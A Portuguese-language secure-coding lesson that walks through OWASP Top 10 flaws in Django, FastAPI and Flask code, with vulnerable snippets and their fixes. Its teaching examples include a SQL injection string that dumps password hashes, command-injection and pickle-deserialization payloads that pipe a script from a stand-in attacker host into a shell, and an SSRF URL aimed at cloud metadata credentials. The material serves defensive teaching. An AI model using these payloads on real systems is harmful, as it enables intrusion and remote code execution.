@@ -1,0 +1,442 @@
+---
+title: "Python e OWASP: Explorando vulnerabilidades e protegendo aplicações"
+kind: lesson
+---
+
+A plataforma de ingressos tem login, pagamento, dados pessoais e um estoque que vale dinheiro. Isso basta para ela ser alvo: alguém vai trocar o número do pedido na URL para ver a compra de outra pessoa, colar uma aspa no campo de busca, enviar um link interno no campo de "URL da imagem do evento" e testar se o `DEBUG` ficou ligado em produção. Nenhum desses ataques exige talento, só uma ferramenta automática e uma aplicação escrita sem atenção.
+
+O OWASP Top 10 é a lista, mantida pela comunidade, das categorias de falha que mais aparecem em aplicações web reais. Este capítulo percorre as que mais atingem código Python e mostra, para cada uma, o trecho vulnerável, como ele é explorado e a correção em Django, Django REST Framework, FastAPI ou Flask. A regra de leitura é simples: os frameworks já protegem bastante, e quase toda falha nasce no ponto em que alguém desligou ou contornou a proteção.
+
+**Você vai aprender:**
+
+- Reconhecer no código as categorias do OWASP Top 10 e explicar como cada uma é explorada
+- Fechar falhas de controle de acesso (IDOR) em views do DRF e rotas do FastAPI
+- Eliminar injeção de SQL e de comando, XSS, CSRF, SSRF e desserialização insegura
+- Guardar senhas e segredos corretamente e endurecer a configuração de produção
+- Automatizar a checagem com `pip-audit`, `bandit` e logs de segurança
+
+## O mapa: OWASP Top 10
+
+A edição de 2021 é a referência que a maioria das vagas e auditorias ainda cita:
+
+| Código | Categoria | Onde aparece no projeto `ingressos` |
+|---|---|---|
+| A01 | Quebra de controle de acesso | Ver ou cancelar o pedido de outro cliente trocando o id |
+| A02 | Falhas criptográficas | Senha em MD5, `SECRET_KEY` no Git, HTTP sem TLS |
+| A03 | Injeção | SQL montado com f-string, `shell=True`, XSS |
+| A04 | Design inseguro | Reserva sem limite por cliente, cupom sem controle de uso |
+| A05 | Configuração insegura | `DEBUG = True`, `ALLOWED_HOSTS = ["*"]`, admin exposto |
+| A06 | Componentes vulneráveis e desatualizados | Dependência com CVE conhecida |
+| A07 | Falhas de identificação e autenticação | Login sem limite de tentativas, sessão que não expira |
+| A08 | Falhas de integridade de software e dados | `pickle.loads` em dado externo, pipeline sem verificação |
+| A09 | Falhas de registro e monitoramento | Ninguém fica sabendo de mil logins falhos |
+| A10 | Server-Side Request Forgery | Servidor busca uma URL informada pelo usuário |
+
+A edição de 2025 reorganiza a lista sem mudar a essência: controle de acesso continua em primeiro (e passa a englobar SSRF), configuração insegura sobe, a categoria de componentes vira "falhas na cadeia de suprimentos de software" e entra uma categoria sobre tratamento incorreto de condições excepcionais. Em entrevista, vale mais explicar bem cinco categorias com exemplo do que recitar a ordem.
+
+## Controle de acesso quebrado e IDOR
+
+Autenticação responde "quem é você"; autorização responde "você pode fazer isto com este objeto". A falha mais comum do mundo é conferir só a primeira. IDOR (Insecure Direct Object Reference) é o caso clássico: a rota recebe um id e devolve o objeto sem verificar de quem ele é.
+
+```python
+# VULNERAVEL: qualquer usuario autenticado le qualquer pedido
+from rest_framework import permissions, viewsets
+
+from ingressos.pedidos.models import Pedido
+from ingressos.pedidos.serializers import PedidoSerializer
+
+
+class PedidoViewSet(viewsets.ModelViewSet):
+    queryset = Pedido.objects.all()
+    serializer_class = PedidoSerializer
+    permission_classes = [permissions.IsAuthenticated]
+```
+
+Basta trocar `/api/pedidos/1041/` por `/api/pedidos/1042/`. A correção mais robusta é restringir o conjunto de dados na origem, de modo que o objeto alheio nem exista para aquela requisição:
+
+```python
+class PedidoViewSet(viewsets.ModelViewSet):
+    serializer_class = PedidoSerializer
+    permission_classes = [permissions.IsAuthenticated]
+
+    def get_queryset(self):
+        return Pedido.objects.filter(cliente=self.request.user)
+
+    def perform_create(self, serializer):
+        serializer.save(cliente=self.request.user)
+```
+
+Com o filtro no `get_queryset`, listagem, detalhe, atualização e exclusão ficam protegidos de uma vez, e o pedido de outro cliente responde 404, sem confirmar que existe. O `perform_create` fecha a outra metade: o dono vem da sessão, nunca do corpo da requisição. No FastAPI o padrão é o mesmo, com a checagem dentro de uma dependência reutilizável:
+
+```python
+from typing import Annotated
+
+from fastapi import Depends, HTTPException, status
+from sqlalchemy import select
+from sqlalchemy.orm import Session
+
+from ingressos.auth import usuario_atual
+from ingressos.db import get_session
+from ingressos.models import Pedido, Usuario
+
+
+def pedido_do_usuario(
+    pedido_id: int,
+    usuario: Annotated[Usuario, Depends(usuario_atual)],
+    session: Annotated[Session, Depends(get_session)],
+) -> Pedido:
+    pedido = session.scalar(
+        select(Pedido).where(Pedido.id == pedido_id, Pedido.cliente_id == usuario.id)
+    )
+    if pedido is None:
+        raise HTTPException(status.HTTP_404_NOT_FOUND, "Pedido nao encontrado")
+    return pedido
+```
+
+Três variações do mesmo problema merecem atenção:
+
+- **Atribuição em massa**: um serializer com `fields = "__all__"` aceita `status` ou `cliente` no corpo e deixa o usuário marcar o próprio pedido como pago. Liste os campos e declare `read_only_fields`. No FastAPI, use um schema Pydantic de entrada separado do de saída.
+- **Escalada vertical**: rotas administrativas (criar evento, estornar pagamento) protegidas só por esconder o botão no front. A permissão precisa estar na view (`IsAdminUser`, `DjangoModelPermissions` ou uma dependência que confere o papel).
+- **Negar por padrão**: defina `DEFAULT_PERMISSION_CLASSES` como `IsAuthenticated` no DRF e abra exceções explicitamente. Uma rota nova esquecida nasce fechada.
+
+Ids aleatórios (UUID) dificultam a enumeração, mas não substituem a checagem: um link compartilhado ou um log vazado entrega o identificador.
+
+## Injeção: SQL e comandos do sistema
+
+Injeção acontece quando dado do usuário é concatenado num texto que outro interpretador vai executar. O ORM do Django e o SQLAlchemy parametrizam as consultas por padrão; o risco está nas saídas de emergência.
+
+```python
+# VULNERAVEL
+from django.db import connection
+
+
+def buscar_eventos(termo: str):
+    with connection.cursor() as cursor:
+        cursor.execute(f"SELECT id, nome FROM eventos_evento WHERE nome LIKE '%{termo}%'")
+        return cursor.fetchall()
+```
+
+Com `termo` igual a `' UNION SELECT id, password FROM auth_user --`, a resposta traz os hashes de senha. A correção é sempre a mesma: o SQL é um texto fixo e os valores viajam separados, como parâmetros.
+
+```python
+def buscar_eventos(termo: str):
+    with connection.cursor() as cursor:
+        cursor.execute(
+            "SELECT id, nome FROM eventos_evento WHERE nome LIKE %s",
+            [f"%{termo}%"],
+        )
+        return cursor.fetchall()
+```
+
+O `%s` aqui não é formatação de string do Python: é o marcador do driver, que envia o valor fora do comando. O mesmo vale para `Evento.objects.raw(sql, [params])`, para `extra()` e para o SQLAlchemy:
+
+```python
+from sqlalchemy import text
+
+eventos = session.execute(
+    text("SELECT id, nome FROM eventos WHERE nome ILIKE :termo"),
+    {"termo": f"%{termo}%"},
+).all()
+```
+
+Parâmetros só substituem valores. Nome de coluna para ordenação, direção e nome de tabela não podem ser parametrizados; para esses, valide contra uma lista fixa (`if ordenar_por not in {"data", "nome"}`), que é exatamente o que o `OrderingFilter` do DRF faz com `ordering_fields`.
+
+A injeção de comando segue a mesma lógica com o shell como interpretador:
+
+```python
+import subprocess
+
+# VULNERAVEL: nome_arquivo = "x.pdf; curl http://atacante/s.sh | sh"
+subprocess.run(f"pdftotext {nome_arquivo} saida.txt", shell=True)
+
+# CORRIGIDO: lista de argumentos, sem shell
+subprocess.run(["pdftotext", "--", nome_arquivo, "saida.txt"], check=True, timeout=30)
+```
+
+Sem `shell=True`, cada item da lista vira um argumento literal e `;`, `|` e `$()` perdem o significado. O `--` impede que um nome começando com `-` seja lido como opção. Na mesma família estão `eval`, `exec` e `os.system` com entrada externa: não existe forma segura de usá-los assim.
+
+## XSS e o auto-escape dos templates
+
+Cross-Site Scripting é injeção no navegador da vítima: o atacante consegue que a página entregue um script dele, que roda com a sessão de quem abriu. Os templates do Django escapam toda variável por padrão, e o Jinja2 do Flask faz o mesmo em arquivos `.html`. O nome de um evento cadastrado como `<script>...</script>` aparece na tela como texto.
+
+A falha aparece quando alguém desliga a proteção:
+
+```html
+<!-- VULNERAVEL: descricao veio de um formulario -->
+<div class="descricao">{{ evento.descricao|safe }}</div>
+
+<!-- VULNERAVEL: atributo sem aspas, o escape nao salva -->
+<img src={{ evento.imagem_url }}>
+
+<!-- CORRIGIDO -->
+<div class="descricao">{{ evento.descricao }}</div>
+<img src="{{ evento.imagem_url }}">
+```
+
+Os equivalentes em Python são `mark_safe()` com texto do usuário e, no Flask, `render_template_string` montado com f-string (que ainda abre a porta para injeção de template no servidor). Quando você precisa montar HTML em código, use `format_html`, que escapa os argumentos:
+
+```python
+from django.utils.html import format_html
+
+
+def link_do_evento(evento) -> str:
+    return format_html('<a href="{}">{}</a>', evento.get_absolute_url(), evento.nome)
+```
+
+Para passar dados ao JavaScript, use o filtro `json_script`, que gera uma tag de dados segura, em vez de interpolar variáveis dentro de um bloco de script. Se o produto exige HTML rico na descrição do evento, sanitize no servidor com uma lista de tags permitidas (a biblioteca `nh3` faz isso) antes de marcar como seguro.
+
+APIs JSON não estão imunes: o dado gravado sem escape vira XSS no front que usar `innerHTML`. A segunda camada de defesa é o cabeçalho Content-Security-Policy, que limita de onde scripts podem ser carregados, e cookies de sessão com `HttpOnly`, que o JavaScript não consegue ler.
+
+## CSRF: quando o cookie viaja sozinho
+
+No CSRF o atacante não rouba a sessão, ele a usa. A vítima, logada na plataforma, abre outra página que envia um formulário escondido para `/pedidos/1041/cancelar/`. O navegador anexa o cookie de sessão automaticamente e o servidor enxerga um pedido legítimo.
+
+O Django se defende com o `CsrfViewMiddleware`: toda requisição que altera estado precisa trazer um token que a página do atacante não tem como ler.
+
+```html
+<form method="post" action="{% url 'pedidos:cancelar' pedido.id %}">
+  {% csrf_token %}
+  <button type="submit">Cancelar pedido</button>
+</form>
+```
+
+As regras que evitam buracos:
+
+- Nunca altere estado em `GET`. Um `GET /pedidos/1041/cancelar/` é explorável com uma simples tag de imagem, e o middleware não confere `GET`.
+- `@csrf_exempt` é para endpoints que têm outra prova de origem, como um webhook com assinatura HMAC. Não é remédio para "o POST está dando 403".
+- No DRF, a `SessionAuthentication` exige o token CSRF; autenticação por JWT no cabeçalho `Authorization` não precisa, porque o navegador não envia esse cabeçalho sozinho. Se você guardar o JWT num cookie, a proteção volta a ser necessária.
+- No Flask, a proteção não vem ligada: use o `CSRFProtect` do Flask-WTF na application factory.
+- `SESSION_COOKIE_SAMESITE = "Lax"` (padrão do Django) já bloqueia boa parte dos envios entre sites. É uma camada extra, não um substituto do token.
+
+## SSRF: o servidor como intermediário
+
+A plataforma deixa o organizador informar a URL da imagem do evento, e o servidor baixa o arquivo para gerar miniaturas. Se a URL for `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, quem faz a requisição é o seu servidor, de dentro da rede, e a resposta pode conter credenciais temporárias da nuvem. Isso é Server-Side Request Forgery.
+
+```python
+import ipaddress
+import socket
+from urllib.parse import urlsplit
+
+import httpx
+
+HOSTS_PERMITIDOS = {"imagens.ingressos.example", "cdn.parceiro.example"}
+
+
+def validar_url_externa(url: str) -> str:
+    partes = urlsplit(url)
+    if partes.scheme != "https" or partes.hostname is None:
+        raise ValueError("URL invalida")
+    if partes.hostname not in HOSTS_PERMITIDOS:
+        raise ValueError("Host nao permitido")
+    for info in socket.getaddrinfo(partes.hostname, 443):
+        ip = ipaddress.ip_address(info[4][0])
+        if not ip.is_global:
+            raise ValueError("Endereco interno")
+    return url
+
+
+def baixar_imagem(url: str) -> bytes:
+    resposta = httpx.get(validar_url_externa(url), timeout=5.0, follow_redirects=False)
+    resposta.raise_for_status()
+    return resposta.content
+```
+
+A lista de hosts permitidos é a defesa principal. A checagem de IP cobre o caso em que um domínio permitido resolve para endereço interno, e `follow_redirects=False` impede que um host válido redirecione para dentro da rede. Quando a lista fixa não é viável (o usuário pode apontar para qualquer site), a checagem de IP vira a defesa principal e deve ser feita no mesmo endereço que será usado na conexão, de preferência com as requisições saindo por um proxy de saída isolado. Na infraestrutura, restrinja o tráfego de saída do contêiner e, na AWS, exija IMDSv2.
+
+## Desserialização insegura: pickle e yaml.load
+
+`pickle` não é um formato de dados, é um programa: ao carregar, ele executa as instruções que o arquivo trouxer.
+
+```python
+import os
+import pickle
+
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ("curl http://atacante.example/s.sh | sh",))
+
+
+carga = pickle.dumps(Exploit())
+pickle.loads(carga)  # executa o comando no servidor
+```
+
+Qualquer `pickle.loads` sobre dado que cruzou uma fronteira de confiança (cookie, fila, cache compartilhado, upload) é execução remota de código. O mesmo vale para `yaml.load` com o carregador completo, que constrói objetos Python arbitrários:
+
+```python
+import json
+
+import yaml
+
+config = yaml.safe_load(conteudo)      # so tipos simples: dict, list, str, int
+carrinho = json.loads(cookie_carrinho)  # JSON nao executa nada
+```
+
+Use JSON para trocar dados e valide a estrutura com Pydantic ou com um serializer do DRF. Se precisar garantir que um valor guardado no cliente não foi adulterado, assine com `django.core.signing` ou `itsdangerous`. Atenção a dois lugares onde o pickle se esconde: o `PickleSerializer` de sessões do Django (removido nas versões atuais, mas presente em projeto legado) e modelos de machine learning salvos com `pickle` ou `joblib`, que só devem ser carregados de fonte confiável.
+
+## Falhas criptográficas: senhas, tokens e segredos
+
+Senha não se criptografa, se transforma com uma função de derivação lenta e com salt, feita para custar caro a quem tentar adivinhar em massa.
+
+```python
+import hashlib
+
+# VULNERAVEL: rapido demais e sem salt; uma GPU testa bilhoes por segundo
+senha_hash = hashlib.sha256(senha.encode()).hexdigest()
+```
+
+O Django resolve com `make_password` e `check_password` (PBKDF2 por padrão). Para usar Argon2, instale `django[argon2]` e coloque o hasher no topo da lista; os hashes antigos continuam válidos e são atualizados no próximo login de cada usuário:
+
+```python
+PASSWORD_HASHERS = [
+    "django.contrib.auth.hashers.Argon2PasswordHasher",
+    "django.contrib.auth.hashers.PBKDF2PasswordHasher",
+]
+```
+
+No FastAPI, a mesma coisa com `pwdlib`:
+
+```python
+from pwdlib import PasswordHash
+
+hasher = PasswordHash.recommended()  # Argon2
+
+senha_hash = hasher.hash("senha-do-cliente")
+assert hasher.verify("senha-do-cliente", senha_hash)
+```
+
+Outras regras da mesma categoria:
+
+- **Aleatoriedade**: tokens de redefinição de senha, códigos de ingresso e chaves de API saem do módulo `secrets` (`secrets.token_urlsafe(32)`), nunca de `random`, que é previsível.
+- **Comparação**: compare tokens e assinaturas com `hmac.compare_digest`, que leva o mesmo tempo para qualquer entrada e não vaza informação pelo tempo de resposta.
+- **JWT**: sempre passe a lista de algoritmos aceitos, `jwt.decode(token, chave, algorithms=["HS256"])`, e mantenha expiração curta. Nunca aceite o algoritmo que o próprio token declara.
+- **Transporte**: TLS em tudo, inclusive entre serviços internos e na conexão com o banco.
+- **Segredos**: `SECRET_KEY`, senha do banco e chaves de API vêm de variável de ambiente ou de um cofre, nunca do repositório. Segredo que entrou no Git está comprometido: troque, não basta apagar o commit.
+
+<Callout type="warning" title="Não invente criptografia">
+Precisa cifrar um dado (CPF, por exemplo)? Use a receita pronta `Fernet`, do pacote `cryptography`, com a chave num cofre. Escolher modo de operação, vetor de inicialização e padding por conta própria é a forma mais comum de errar, mesmo usando um algoritmo forte.
+</Callout>
+
+## Configuração insegura e dependências vulneráveis
+
+Com `DEBUG = True`, qualquer erro devolve ao visitante o traceback, variáveis locais e trechos das configurações. Com `ALLOWED_HOSTS = ["*"]`, o Django aceita qualquer cabeçalho `Host`, o que permite envenenar links de redefinição de senha. A configuração de produção deve nascer fechada:
+
+```python
+# ingressos/settings/producao.py
+import os
+
+DEBUG = False
+SECRET_KEY = os.environ["DJANGO_SECRET_KEY"]  # falha na subida se faltar
+ALLOWED_HOSTS = ["ingressos.example", "api.ingressos.example"]
+
+SECURE_SSL_REDIRECT = True
+SECURE_PROXY_SSL_HEADER = ("HTTP_X_FORWARDED_PROTO", "https")
+SECURE_HSTS_SECONDS = 31536000
+SESSION_COOKIE_SECURE = True
+CSRF_COOKIE_SECURE = True
+SECURE_CONTENT_TYPE_NOSNIFF = True
+X_FRAME_OPTIONS = "DENY"
+```
+
+O próprio Django confere essa lista:
+
+```bash
+python manage.py check --deploy
+```
+
+No FastAPI, a documentação interativa pode ser desligada em produção com `FastAPI(docs_url=None, redoc_url=None, openapi_url=None)` quando a API não é pública, e o CORS deve listar origens em vez de usar `*` com credenciais. No Flask, nunca suba com `debug=True`: o depurador do Werkzeug permite executar código pelo navegador.
+
+Dependências entram na mesma conta. Uma versão antiga de biblioteca com CVE publicada é explorável por ferramenta automática.
+
+```bash
+pip install pip-audit bandit
+pip-audit                          # audita o ambiente virtual ativo
+pip-audit -r requirements.txt      # ou um arquivo de requisitos
+bandit -r src/ingressos -ll        # analise estatica, severidade media ou maior
+```
+
+O `pip-audit` cruza as versões instaladas com bases públicas de vulnerabilidades e indica a versão corrigida. O `bandit` lê o código-fonte e aponta padrões perigosos: `shell=True`, `pickle.loads`, `yaml.load`, `hashlib.md5`, SQL montado por concatenação, `assert` usado como controle de acesso, `verify=False` em chamadas HTTP. Os dois rodam no pipeline do capítulo de Integração Contínua como etapas que quebram o build:
+
+```yaml
+      - name: Seguranca
+        run: |
+          pip-audit
+          bandit -r src/ingressos -ll
+```
+
+Fixe as versões com um arquivo de lock, ative o Dependabot ou o Renovate para receber as atualizações como pull request e trate alerta de segurança como bug, com prazo.
+
+<Callout type="tip" title="Falso positivo se documenta">
+Quando o `bandit` acusa algo que você analisou e é seguro, marque a linha com `# nosec` seguido do código da regra e de uma justificativa curta. Um `nosec` sem explicação é o mesmo que desligar o alarme.
+</Callout>
+
+## Logs de segurança e limite de tentativas
+
+Ataque quase nunca acerta na primeira tentativa. Mil logins falhos para a mesma conta, sequências de 404 em `/api/pedidos/` com ids crescentes e picos de 403 são sinais visíveis, desde que alguém os registre e olhe.
+
+```python
+import logging
+
+from django.contrib.auth.signals import user_login_failed
+from django.dispatch import receiver
+
+logger = logging.getLogger("ingressos.seguranca")
+
+
+@receiver(user_login_failed)
+def registrar_falha_de_login(sender, credentials, request, **kwargs):
+    logger.warning(
+        "login_falhou",
+        extra={
+            "usuario": credentials.get("username", ""),
+            "ip": request.META.get("REMOTE_ADDR") if request else None,
+        },
+    )
+```
+
+Registre falhas e sucessos de login, negações de acesso, trocas de senha e de e-mail, e ações administrativas, sempre com quem, o quê, quando e de onde. Nunca registre senha, token, número de cartão ou o corpo inteiro da requisição. O Django já publica eventos como CSRF rejeitado e `Host` inválido no logger `django.security`: encaminhe-o para o mesmo destino.
+
+Log sem alerta é arquivo morto. Envie os registros para um agregador e crie alarmes para os padrões acima. Do lado da prevenção, limite tentativas: o throttling do DRF (visto no capítulo de autenticação e permissões) com um escopo específico para login, ou bloqueio progressivo por conta com `django-axes`. E devolva a mesma mensagem para "usuário não existe" e "senha errada", para não confirmar quais e-mails estão cadastrados.
+
+## Na entrevista
+
+**O que é IDOR e como você evita?** É acessar um objeto alheio trocando o identificador na requisição, porque a aplicação só confere se há login. Evito filtrando o queryset pelo usuário autenticado (ou conferindo o dono numa dependência), respondendo 404 para objetos de terceiros e negando por padrão.
+
+**Por que consultas parametrizadas impedem injeção de SQL?** Porque o comando e os valores chegam ao banco separados: o texto do SQL é fixo e o valor nunca é interpretado como código. Concatenar ou usar f-string mistura os dois. Identificadores, como nome de coluna, não são parametrizáveis e precisam de lista de permitidos.
+
+**Qual a diferença entre XSS e CSRF?** No XSS o atacante faz o script dele rodar na página da vítima e ganha acesso a tudo o que a página enxerga. No CSRF ele não lê nada: apenas induz o navegador da vítima a enviar uma requisição autenticada. Auto-escape e CSP tratam o primeiro; token CSRF e `SameSite` tratam o segundo.
+
+**Por que não usar SHA-256 para senhas?** Porque é rápido: com o banco vazado, o atacante testa bilhões de candidatas por segundo. Funções como Argon2, bcrypt e PBKDF2 são lentas de propósito, usam salt por senha e têm custo ajustável.
+
+**Por que `pickle.loads` em dado externo é perigoso?** O formato pickle descreve como reconstruir objetos, e isso inclui chamar funções arbitrárias. Quem controla os bytes executa código no servidor. Para dados externos, JSON com validação de esquema.
+
+**O que você confere antes de subir um Django para produção?** `DEBUG` desligado, `SECRET_KEY` fora do código, `ALLOWED_HOSTS` restrito, cookies `Secure`, HTTPS forçado com HSTS, `check --deploy` limpo, dependências auditadas e logs de segurança chegando a algum lugar que alerta.
+
+## Pratique
+
+1. Escreva dois testes com pytest para a API de pedidos: o cliente A recebe 404 ao ler e ao cancelar um pedido do cliente B. Rode-os contra a versão sem filtro para ver falhar e depois corrija com `get_queryset`.
+2. Procure no projeto por `raw(`, `cursor.execute`, `text(`, `shell=True`, `|safe`, `mark_safe`, `pickle` e `yaml.load`. Para cada ocorrência, prove que não recebe entrada externa ou corrija.
+3. Implemente o download da imagem do evento com `validar_url_externa` e escreva testes que rejeitam `http://`, `localhost`, `169.254.169.254` e um host fora da lista.
+4. Crie `settings/producao.py` lendo segredos do ambiente, migre o hasher de senhas para Argon2 e deixe `python manage.py check --deploy` sem avisos.
+5. Adicione `pip-audit` e `bandit` ao pipeline do GitHub Actions como etapa obrigatória e registre falhas de login no logger `ingressos.seguranca`.
+
+<Quiz question="Qual correção fecha de forma mais completa o IDOR num ModelViewSet de pedidos?" options={["Trocar o id sequencial por UUID","Filtrar get_queryset pelo usuário autenticado","Exigir HTTPS na rota","Esconder o link no front-end"]} answer={1} explanation="Com o queryset restrito ao dono, listagem, detalhe, atualização e exclusão ficam protegidos e o objeto alheio responde 404. UUID só dificulta adivinhar o id." />
+
+<Quiz question="Por que subprocess.run com uma lista de argumentos e sem shell=True evita injeção de comando?" options={["Porque o Python valida os argumentos","Porque o processo roda sem privilégios","Porque o subprocess escapa aspas automaticamente","Porque nenhum shell interpreta o texto e cada item vira um argumento literal"]} answer={3} explanation="Sem shell, caracteres como ponto e vírgula, pipe e cifrão não têm significado especial: o programa recebe cada item da lista exatamente como foi passado." />
+
+<Quiz question="Qual par de funções é adequado para carregar dados vindos de fora da aplicação?" options={["json.loads e yaml.safe_load","pickle.loads e yaml.load","eval e json.loads","pickle.loads e yaml.safe_load"]} answer={0} explanation="JSON e o carregador seguro do YAML só constroem tipos simples. pickle, eval e o carregador completo do YAML podem executar código escolhido por quem controla a entrada." />
+
+## Base no CodeForge
+
+- [Django REST Framework: Trabalhando com autenticação, permissões e limites de requisição](/learn/carreira-python/django-rest-framework-autenticacao-permissoes-limites): permissões e throttling que este capítulo pressupõe.
+- [Django: Autenticação de formulários e alerta](/learn/carreira-python/django-autenticacao-formularios-alerta): sessão, formulários e o token CSRF na prática.
+- [Armazenamento de senhas](/learn/system-design/armazenamento-de-senhas) e [Gestão de segredos](/learn/system-design/gestao-de-segredos): a teoria por trás de hash lento, salt e cofres.
+- [JWT](/learn/system-design/jwt) e [RBAC](/learn/system-design/rbac): tokens e modelos de autorização.
+- [Node.js: Desenvolvimento seguro](/learn/carreira-nodejs/desenvolvimento-seguro): as mesmas categorias vistas em outra stack.
+
+## Referências
+
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+- [Django: Security in Django](https://docs.djangoproject.com/en/5.2/topics/security/)
+- [Django: Deployment checklist](https://docs.djangoproject.com/en/5.2/howto/deployment/checklist/)
+- [FastAPI: Security](https://fastapi.tiangolo.com/tutorial/security/)
